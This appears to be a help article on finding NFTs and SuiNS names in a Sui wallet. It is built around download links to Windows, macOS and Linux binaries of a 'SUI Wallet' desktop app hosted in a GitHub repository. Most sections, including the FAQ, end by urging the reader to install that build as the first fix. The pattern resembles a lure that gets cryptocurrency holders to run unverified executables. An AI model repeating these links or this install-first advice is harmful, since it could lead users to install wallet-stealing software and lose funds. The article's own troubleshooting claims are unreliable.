![SUI Wallet](assets/banner-article.png)

# Viewing NFTs in SUI Wallet

Sui objects show up as objects; a missing one is usually a different account.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

Objects the account owns appear in the wallet's object list, with the account's other holdings, once the
account has read the chain. If one is missing, the usual causes are a different address, a mint that never
completed, or a build older than the current release - in that order, and the last one is the cheapest to
rule out.

## What an NFT is on Sui

An NFT here is an object: a piece of state with an owner, a type and contents. It is not a row in a database
belonging to a marketplace, and no company has to list it for it to exist.

That is why the wallet can show one at all. It reads the objects the address owns and draws what it finds,
which also means a mint that failed leaves nothing to draw rather than an empty placeholder.

It also explains why two wallets can disagree about what you own. Each reads the same objects and draws what its version understands, so a build that predates a change in object structure shows less than the chain holds. The chain is the record; the list is a rendering.

## Where the list is

The wallet shows the account's objects alongside its balance, filtered by what you are looking for. SuiNS names appear the same way, because a name is an object with an owner too. An empty list and a failed read look alike at first.

If the list is empty and the balance is not, the address is reading the chain correctly and simply owns no
objects of that kind - which is a different situation from the list failing to load.
[SUI Wallet balance not updating](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/sui-wallet-balance-not-updating.md) covers the loading question, which looks identical at first
glance and has a different answer.

## The four reasons one is missing

Four causes account for almost every missing piece: a different address, a mint that never completed, a build older than the current release, or a marketplace that has not caught up. The first two are usual, and the third is the cheapest to rule out.

**A mint that did not complete.** A transaction that failed mints nothing, and the fee is spent anyway.
There is no half-object to find, and no support ticket that produces one.

**A build older than the current release.** Reported problems are fixed in the latest release, and display
problems are among them. Installing it is the fix, and it is the first thing worth doing when everything
else checks out.

**A marketplace that has not caught up.** Some pieces are shown by the marketplace that minted them before
any wallet displays them. That is a delay in one interface rather than a fact about the chain.

## Reading one without the wallet

Any explorer shows an address's objects, which is the independent check worth having when the wallet and your memory disagree about what is there. Paste the address, look at the objects, and the question becomes factual rather than a matter of recollection.

Keep the address from the wallet's own screen rather than from a message. An address supplied by a stranger
shows a stranger's objects, and the disappointment that follows is the point of the trick.

Explorers differ in how much they decode, so one that shows an object as raw data has still answered the question you asked: it is there, or it is not.

## Display is not custody

The wallet displays what the address owns; it does not take custody of it. An object that appears in the
list is on the chain with your address as its owner, and an object that does not appear is still yours if
the mint succeeded.

That distinction decides what to do when a screen is wrong: check the chain, then update the application.
Neither step involves moving the piece anywhere.
[Sending NFTs from SUI Wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/sending-nfts-from-sui-wallet.md) covers the other direction, including what a transfer needs and
what it costs.

That sentence covers the awkward cases too. A piece that a marketplace no longer lists is still in the account, a piece whose site has gone is still in the account, and a piece the wallet draws badly is still in the account. None of those is a loss; all three look like one.

## The release question

If the piece is on the chain under your address, the current release from the
[release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest) is the one to
look in, because display problems reported against older builds are fixed there. The
[repository](https://github.com/sui-blockchain-wallet/sui-wallet-desktop) records what each release changed,
which is faster than reinstalling on a hunch.

## FAQ

### Where do I see my NFTs in SUI Wallet?

In the account's object list, beside the balance, after the wallet has read the chain. SuiNS names appear
there too, because a name is an object like any other.

### Why can I not find my NFT in Sui Wallet?

Check the address first, then whether the mint completed, then the build. Display problems in older builds
are fixed in the current release, which makes the update the cheapest test.

### Does the wallet need to "add" an NFT?

No. Objects owned by the address are read from the chain, so there is no import step and no listing to
request.

### Is an NFT that is missing from the list gone?

Not necessarily. If the mint succeeded, the object is on the chain and an explorer will show it under your
address whatever the wallet draws.

### Can I see NFTs for a different address?

Yes, in an explorer. Watching an address shows its objects without giving you any control over them.

### Do NFTs cost anything to hold?

No. Holding is a state of the chain rather than a service, and there is no fee for an object sitting in an
account.
